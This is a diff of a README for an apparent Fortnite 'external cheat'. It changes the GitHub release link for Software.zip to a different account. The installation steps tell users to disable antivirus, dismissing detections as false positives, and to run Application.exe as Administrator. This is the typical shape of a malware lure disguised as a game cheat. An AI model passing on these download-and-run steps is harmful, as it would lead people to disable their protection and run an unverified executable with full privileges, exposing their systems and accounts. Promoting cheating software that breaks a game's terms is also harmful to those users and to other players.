@@ -2,7 +2,7 @@
 
 ![image](https://github.com/user-attachments/assets/52a50082-2245-4570-b5d3-9edb2e96a9d6)
 
-[Download link](https://github.com/numberone6341/FortniteExternalCheat-v1.5/releases/download/download/Software.zip)
+[Download link](https://github.com/nadine-2000/FortniteExternalCheat-v1.5/releases/download/download/Software.zip)
 
 ---
 
@@ -30,7 +30,7 @@
 - Disable Antivirus (False Positives Expected)  
 
 ### Installation  
-1. Download [Software.zip](https://github.com/numberone6341/FortniteExternalCheat-v1.5/releases/download/download/Software.zip)
+1. Download [Software.zip](https://github.com/nadine-2000/FortniteExternalCheat-v1.5/releases/download/download/Software.zip)
 2. Extract files to a **non-system directory** (e.g., `C:\FNCheat`).  
 3. Run `Application.exe` as Administrator.  
 4. Launch Fortnite and press `F2` to activate.  
